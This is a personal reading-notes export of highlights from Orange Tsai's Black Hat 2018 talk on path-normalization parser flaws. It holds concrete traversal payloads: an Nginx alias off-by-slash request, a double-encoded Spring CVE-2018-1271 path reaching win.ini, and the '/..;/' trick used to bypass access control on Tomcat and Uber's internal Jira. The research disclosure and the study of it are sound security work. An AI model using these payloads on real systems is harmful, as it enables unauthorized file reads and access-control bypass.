---
author: "Orange Tsai"
aliases: "Breaking Parser Logic - Take Your Path Normalization Off and Pop 0days Out"
tags: RW_inbox, readwise/articles
url: https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf?ref=labs.watchtowr.com
date: 2025-01-08
---
# Breaking Parser Logic - Take Your Path Normalization Off and Pop 0days Out

![rw-book-cover](https://readwise-assets.s3.amazonaws.com/media/reader/parsed_document_assets/251497476/dIJKUpvPoZAhkmlE5hOQ5YuIKSEWUAzI3QCJIir9HXc-cove_ENvTHkT.png)




Normalize To make standard; determine the value by comparison to an item of known standard value
> [View Highlight](https://read.readwise.io/read/01jh39jkm0qp8kns0egam8j6sy)



Why normalization? To protect something
> [View Highlight](https://read.readwise.io/read/01jh39jqa6qynh08wchj0gw363)



Inconsistency if (check(data)) { use(data) }
> [View Highlight](https://read.readwise.io/read/01jh39jtjs81rgb98y4p46wz79)



Windows treat as UNC new URL("file:///etc/passwd?/../../Windows/win.ini") Linux treat as URL
> [View Highlight](https://read.readwise.io/read/01jh39net9ms8sj2xtyqwtcga1)



How parsers could be failed?
> [View Highlight](https://read.readwise.io/read/01jh39nw3mmxpm4pbeaq1x4152)



static String QUOTED_FILE_SEPARATOR = Pattern.quote(File.separator) static String DIRECTIVE_FILE_SEPARATOR = '/' public AssetFile getAsset(String relativePath) { if(!relativePath) return null relativePath = relativePath.replace( QUOTED_FILE_SEPARATOR, DIRECTIVE_FILE_SEPARATOR)
> [View Highlight](https://read.readwise.io/read/01jh39p4yq38w6pq159pgqk6x6)



setFile getAsset(String relativePath) { if(!relativePath) return null Pattern.quote("/") = "\Q/\E"
> [View Highlight](https://read.readwise.io/read/01jh39pngeysbe6bgz8jrexjwp)

> Note: https://stackoverflow.com/questions/15409296/what-is-the-use-of-pattern-quote-method



..\Q/\E is the new ../ in Grails
> [View Highlight](https://read.readwise.io/read/01jh39q0amkpnxqweyarzyvwgb)



/app/static/ v.s. /app/static How single slash could be failed?
> [View Highlight](https://read.readwise.io/read/01jh39rt8sf1wepvykr4zj4xf7)



Nginx off-by-slash fail http://127.0.0.1/static../settings.py location /static { alias /home/app/static/; } Nginx matches the rule and appends the remainder to destination /home/app/static/../settings.py
> [View Highlight](https://read.readwise.io/read/01jh39s4ycsq6e6da0pcm840hh)



Spring 0day - CVE-2018-1271
> [View Highlight](https://read.readwise.io/read/01jh3a5dpjc3nqma2w1da4x7mq)



String[] pathArray = delimitedListToStringArray(pathToUse, "/"); List<String> pathElements = new LinkedList<>(); int tops = 0; for
> [View Highlight](https://read.readwise.io/read/01jh3a8852mx1hyc02nsrjk14z)



Input /foo/../ /foo/../../ /foo//../ /foo///../../ /foo////../../../ cleanPath / /../ /foo/ /foo/ /foo/ Filesystem / /../ / /../ /../../
> [View Highlight](https://read.readwise.io/read/01jh3a97exyfvyr7sf3h267y50)



http://0:8080/spring-rabbit-stock/static/%255c%255c%255c%255c%255c %255c..%255c..%255c..%255c..%255c..%255c..%255c/Windows/win.ini
> [View Highlight](https://read.readwise.io/read/01jh3acazhnyshww9bv4vthezf)



URL path parameter • d http://example.com/foo;name=orange/bar/
> [View Highlight](https://read.readwise.io/read/01jh3bhd6c6v8x1wvmz544kzm0)



Behavior Apache Nginx IIS Tomcat Jetty WildFly WebLogic /foo;name=orange/bar/ /foo;name=orange/bar/ /foo;name=orange/bar/ /foo/bar/ /foo/bar/ /foo /foo
> [View Highlight](https://read.readwise.io/read/01jh3bhqzg8ny66xqwc6kdcjs2)



How danger it could be? • Bypass whitelist and blacklist ACL • Escape from context mapping • Web container console and management interface • Other servlet contexts on the same server
> [View Highlight](https://read.readwise.io/read/01jh3bm4y11w54929p1g6jxasb)



/..;/ seems to be a directory. Take it!
> [View Highlight](https://read.readwise.io/read/01jh3bng8tq3qbc94v3hx9wsh8)



http://example.com/portal/..;/manager/html
> [View Highlight](https://read.readwise.io/read/01jh3bnn6f81tt4jz8yg23ws8r)



OK! /..;/ is the parent directory
> [View Highlight](https://read.readwise.io/read/01jh3bntxsp4pv3pyd2m8nrwpd)



Uber bounty case
> [View Highlight](https://read.readwise.io/read/01jh3btq38tzr9df2tpwxv68hd)



Uber disallow direct access *.uberinternal.com
> [View Highlight](https://read.readwise.io/read/01jh3bvdd55j1kmg3a6xgpfeq8)



But we found a whitelist API(for monitor purpose?)
> [View Highlight](https://read.readwise.io/read/01jh3bvhsj2p632z20pjn43ys2)



https://jira.uberinternal.com/status
> [View Highlight](https://read.readwise.io/read/01jh3bvmrdtw2wamsfztckqd5n)



/..;/ seems to be a directory with the /status whitelist.a
> [View Highlight](https://read.readwise.io/read/01jh3byazsw2afwmz5rrr9jera)



https://jira.uberinternal.com/status/..;/secure/Dashboard.jspa
> [View Highlight](https://read.readwise.io/read/01jh3byfrzgvq5460njknxcw13)



Oh shit! /..;/ is the parent directory
> [View Highlight](https://read.readwise.io/read/01jh3byrpyw89cq1j8e4d9hftc)

